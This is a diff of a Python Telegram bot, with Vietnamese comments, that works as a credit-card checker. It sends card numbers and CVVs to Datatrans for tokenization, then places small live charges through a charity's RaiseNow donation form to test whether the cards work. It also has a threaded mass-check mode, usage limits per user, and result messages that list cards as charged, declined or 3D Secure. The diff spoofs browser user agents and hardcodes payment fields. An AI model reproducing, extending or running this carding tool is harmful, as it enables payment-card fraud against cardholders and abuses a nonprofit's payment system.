@@ -378,10 +378,6 @@ def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
 def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event):
     """Logic cho Gate 4: Charge 0.5$ V4 (dựa trên hình ảnh)"""
     try:
-        brand_upper = (bin_info.get('brand') or '').upper()
-        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'ECA') # Mặc định là ECA như trong ảnh
-        brand_code = payment_method.lower()
-
         # Step 1: Tokenize card
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
         tokenize_payload = {
@@ -389,9 +385,9 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
             "formId": "250802080040638504",
             "cardNumber": cc,
             "cvv": cvv,
-            "paymentMethod": payment_method,
+            "paymentMethod": "ECA",
             "merchantId": "3000022877",
-            "browserUserAgent": ua,
+            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
             "browserJavaEnabled": "false",
             "browserLanguage": "vi-VN",
             "browserColorDepth": "24",
@@ -400,6 +396,9 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
             "browserTZ": "-420"
         }
         tokenize_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Origin": "https://pay.datatrans.com",
             "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=32stkhqhm",
@@ -425,7 +424,7 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
         # Step 2: Make payment request
         payment_url = "https://api.raisenow.io/payments"
         payment_payload = {
-            "account_uuid": "0e83cbe3-4186-4bfb-a8e2-4c319e8902c2",
+            "account_uuid": "0e83cbe3-4186-4fbf-a8e2-4c319e8902c2",
             "test_mode": False,
             "create_supporter": False,
             "amount": {"currency": "EUR", "value": 50},
@@ -446,10 +445,10 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
                 "analytics": {
                     "channel": "embed",
                     "preselected_amount": "2500",
-                    "suggested_amounts": "[2500,5000,0.15000]",
-                    "user_agent": ua
+                    "suggested_amounts": "[2500,5000,15000]",
+                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                 },
-                "solution": {"uuid": "7562d73f-6a18-4605-a534-47196396ad54", "name": "EDRI Form", "type": "donate"},
+                "solution": {"uuid": "7562d73f-6a18-4605-a534-47196396ad54", "name": "EDRi Form", "type": "donate"},
                 "product": {
                     "name": "tamaro",
                     "source_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en",
@@ -459,7 +458,7 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
             },
             "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
             "payment_information": {
-                "brand_code": brand_code,
+                "brand_code": "eca",
                 "cardholder": "Minh Nhat",
                 "expiry_month": mes,
                 "expiry_year": ano,
@@ -469,6 +468,9 @@ def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
             "return_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en&rnw-view=payment_result"
         }
         payment_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*",
             "Content-Type": "application/json",
             "Origin": "https://donate.raisenow.io",
             "Referer": "https://donate.raisenow.io/"
@@ -808,10 +810,10 @@ async def add_limit_command(update, context):
     save_json_file(LIMIT_FILE, limits)
     
     await update.message.reply_text(f"✅ **Cập nhật giới hạn /mass thành công!**\n\n"
-                                        f"👤 **User ID:** `{target_user_id_str}`\n"
-                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
-                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
-                                        f"📊 **Tổng mới:** `{new_limit}`")
+                                      f"👤 **User ID:** `{target_user_id_str}`\n"
+                                      f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                      f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                      f"📊 **Tổng mới:** `{new_limit}`")
 
 async def add_multi_limit_command(update, context):
     if update.effective_user.id != ADMIN_ID: return
@@ -832,10 +834,10 @@ async def add_multi_limit_command(update, context):
     save_json_file(MULTI_LIMIT_FILE, limits)
     
     await update.message.reply_text(f"✅ **Cập nhật giới hạn /multi thành công!**\n\n"
-                                        f"👤 **User ID:** `{target_user_id_str}`\n"
-                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
-                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
-                                        f"📊 **Tổng mới:** `{new_limit}`")
+                                      f"👤 **User ID:** `{target_user_id_str}`\n"
+                                      f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                      f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                      f"📊 **Tổng mới:** `{new_limit}`")
 
 async def bin_command(update, context):
     user = update.effective_user
@@ -921,36 +923,36 @@ async def cs_command(update, context):
 
         if is_invalid_bin_decline:
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
-                                f"**💳 Card:** `{original_line}`\n"
-                                f"**🚦 Status: ❌ DECLINED**\n"
-                                f"**💬 Response:** `Invalid Card Number (BIN not found)`\n\n"
-                                f"**🏦 Gateway:** `BIN Check`\n\n"
-                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
-                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+                               f"**💳 Card:** `{original_line}`\n"
+                               f"**🚦 Status: ❌ DECLINED**\n"
+                               f"**💬 Response:** `Invalid Card Number (BIN not found)`\n\n"
+                               f"**🏦 Gateway:** `BIN Check`\n\n"
+                               f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                               f"👤 *Checker by: {ADMIN_USERNAME}*")
         elif is_invalid_cardnumber_decline:
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
-                                f"**💳 Card:** `{original_line}`\n"
-                                f"**🚦 Status: ❌ DECLINED**\n"
-                                f"**💬 Response:** `Invalid Card Number`\n\n"
-                                f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
-                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
-                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+                               f"**💳 Card:** `{original_line}`\n"
+                               f"**🚦 Status: ❌ DECLINED**\n"
+                               f"**💬 Response:** `Invalid Card Number`\n\n"
+                               f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
+                               f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                               f"👤 *Checker by: {ADMIN_USERNAME}*")
         elif is_expired_card_decline:
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
-                                f"**💳 Card:** `{original_line}`\n"
-                                f"**🚦 Status: ❌ DECLINED**\n"
-                                f"**💬 Response:** `Card Expired`\n\n"
-                                f"**🏦 Gateway:** `Pre-Check`\n\n"
-                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
-                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+                               f"**💳 Card:** `{original_line}`\n"
+                               f"**🚦 Status: ❌ DECLINED**\n"
+                               f"**💬 Response:** `Card Expired`\n\n"
+                               f"**🏦 Gateway:** `Pre-Check`\n\n"
+                               f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                               f"👤 *Checker by: {ADMIN_USERNAME}*")
         elif is_vn_decline:
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
-                                f"**💳 Card:** `{original_line}`\n"
-                                f"**🚦 Status: ❌ DECLINED**\n"
-                                f"**💬 Response:** `DECLINED (Vietnam BIN)`\n\n"
-                                f"**🏦 Gateway:** `{gate_name}`\n\n"
-                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
-                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+                               f"**💳 Card:** `{original_line}`\n"
+                               f"**🚦 Status: ❌ DECLINED**\n"
+                               f"**💬 Response:** `DECLINED (Vietnam BIN)`\n\n"
+                               f"**🏦 Gateway:** `{gate_name}`\n\n"
+                               f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                               f"👤 *Checker by: {ADMIN_USERNAME}*")
         else:
             status_map = {
                 'success': ("✅ CHARGED 0.5$", "Transaction successful!"),
@@ -987,13 +989,13 @@ async def cs_command(update, context):
                 response_display_part = f"**💬 Response:** `{response_message}`"
 
             final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
-                                f"**💳 Card:** `{original_line}`\n"
-                                f"**🚦 Status: {status_text}**\n"
-                                f"{response_display_part}\n\n"
-                                f"ℹ️ **BIN Info:**\n{bin_details_str}\n\n"
-                                f"**🏦 Gateway:** `{gate_name}`\n\n"
-                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
-                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+                               f"**💳 Card:** `{original_line}`\n"
+                               f"**🚦 Status: {status_text}**\n"
+                               f"{response_display_part}\n\n"
+                               f"ℹ️ **BIN Info:**\n{bin_details_str}\n\n"
+                               f"**🏦 Gateway:** `{gate_name}`\n\n"
+                               f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                               f"👤 *Checker by: {ADMIN_USERNAME}*")
         
         await msg.edit_text(final_message)
         
@@ -1271,13 +1273,13 @@ async def mass_check_handler(update, context):
                 if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                     progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                     status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
-                                    f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`\n"
-                                    f"**Progress:** `{processed_count}/{total_lines}`\n\n"
-                                    f"✅ **Charged:** `{counts['success']}`\n"
-                                    f"❌ **Declined:** `{counts['decline']}`\n"
-                                    f"🔒 **3D Secure:** `{counts['custom']}`\n"
-                                    f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
-                                    f"❔ **Errors:** `{counts['error']}`")
+                                     f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`\n"
+                                     f"**Progress:** `{processed_count}/{total_lines}`\n\n"
+                                     f"✅ **Charged:** `{counts['success']}`\n"
+                                     f"❌ **Declined:** `{counts['decline']}`\n"
+                                     f"🔒 **3D Secure:** `{counts['custom']}`\n"
+                                     f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
+                                     f"❔ **Errors:** `{counts['error']}`")
                     try: 
                         await status_message.edit_text(text=status_text)
                     except telegram.error.BadRequest as e:
@@ -1570,16 +1572,16 @@ async def show_check_command(update, context):
             username = data.get('username')
             user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
             message += (f"👤 **{user_display}** (`{user_id_str}`)\n"
-                        f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
-                        f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
-                        f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
-                        f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
-                        f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa check')}`\n"
-                        f"--------------------\n")
+                          f"  ✅ Charged: `{data.get('total_charged', 0)}`\n"
+                          f"  🔒 Custom: `{data.get('total_custom', 0)}`\n"
+                          f"  ❌ Declined: `{data.get('total_decline', 0)}`\n"
+                          f"  ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
+                          f"  🕒 Lần cuối: `{data.get('last_check_timestamp', 'Chưa check')}`\n"
+                          f"--------------------\n")
         else:
             message += (f"👤 **ID: {user_id_str}**\n"
-                        f"  *Chưa từng check hoặc dữ liệu lỗi.*\n"
-                        f"--------------------\n")
+                          f"  *Chưa từng check hoặc dữ liệu lỗi.*\n"
+                          f"--------------------\n")
     
     if len(message) > 4096:
         with io.BytesIO(message.encode('utf-8')) as doc:
